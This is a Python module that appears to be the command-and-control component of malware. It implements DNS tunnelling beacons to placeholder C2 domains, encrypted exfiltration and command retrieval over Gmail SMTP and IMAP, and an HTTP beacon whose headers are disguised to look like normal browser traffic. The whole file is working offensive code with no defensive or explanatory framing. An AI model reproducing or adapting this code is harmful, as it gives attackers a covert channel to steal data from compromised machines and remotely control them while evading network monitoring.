import imaplib
import smtplib
import dns.resolver
import requests
import random
import time
import json
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from ..core.crypter import Crypter

class Communication:
    def __init__(self, email=None, password=None):
        self.email = email
        self.password = password
        self.crypter = Crypter()
        self.c2_domains = [
            "example1.com",
            "example2.com",
            "example3.com"
        ]
        
    def _encode_dns_data(self, data):
        """Encode data for DNS transmission"""
        encoded = base64.b32encode(data.encode()).decode()
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        return chunks
        
    def _decode_dns_data(self, chunks):
        """Decode data from DNS transmission"""
        encoded = ''.join(chunks)
        return base64.b32decode(encoded).decode()
        
    def send_dns_beacon(self, data):
        """Send data via DNS queries"""
        try:
            chunks = self._encode_dns_data(data)
            responses = []
            
            for i, chunk in enumerate(chunks):
                domain = f"{chunk}.{random.choice(self.c2_domains)}"
                try:
                    answers = dns.resolver.resolve(domain, 'TXT')
                    for rdata in answers:
                        responses.extend(str(rdata).strip('"').split())
                except:
                    continue
                    
            return self._decode_dns_data(responses) if responses else None
        except:
            return None
            
    def send_email_beacon(self, data):
        """Send data via email"""
        if not (self.email and self.password):
            return False
            
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = f"Status Report {time.time()}"
            
            # Encrypt the data
            encrypted_data = self.crypter.encrypt(data)
            
            # Encode as base64 string
            encoded_data = base64.b64encode(encrypted_data).decode()
            
            msg.attach(MIMEText(encoded_data))
            
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(self.email, self.password)
                server.send_message(msg)
                
            return True
        except:
            return False
            
    def check_email_commands(self):
        """Check email for new commands"""
        if not (self.email and self.password):
            return None
            
        try:
            with imaplib.IMAP4_SSL('imap.gmail.com') as imap:
                imap.login(self.email, self.password)
                imap.select('INBOX')
                
                # Search for command emails
                _, message_numbers = imap.search(None, '(SUBJECT "Command")')
                
                for num in message_numbers[0].split():
                    _, msg_data = imap.fetch(num, '(RFC822)')
                    email_body = msg_data[0][1]
                    
                    # Extract and decrypt command
                    try:
                        encrypted_command = base64.b64decode(email_body)
                        command = self.crypter.decrypt(encrypted_command)
                        return command.decode()
                    except:
                        continue
                        
                return None
        except:
            return None
            
    def send_http_beacon(self, data, url):
        """Send data via HTTP request"""
        try:
            # Encrypt data
            encrypted_data = self.crypter.encrypt(data)
            
            # Prepare headers to look like normal traffic
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            # Send request
            response = requests.post(url, 
                                  data={'data': base64.b64encode(encrypted_data).decode()},
                                  headers=headers,
                                  timeout=10)
            
            if response.status_code == 200:
                try:
                    # Decrypt response
                    encrypted_response = base64.b64decode(response.text)
                    return self.crypter.decrypt(encrypted_response).decode()
                except:
                    pass
                    
            return None
        except:
            return None
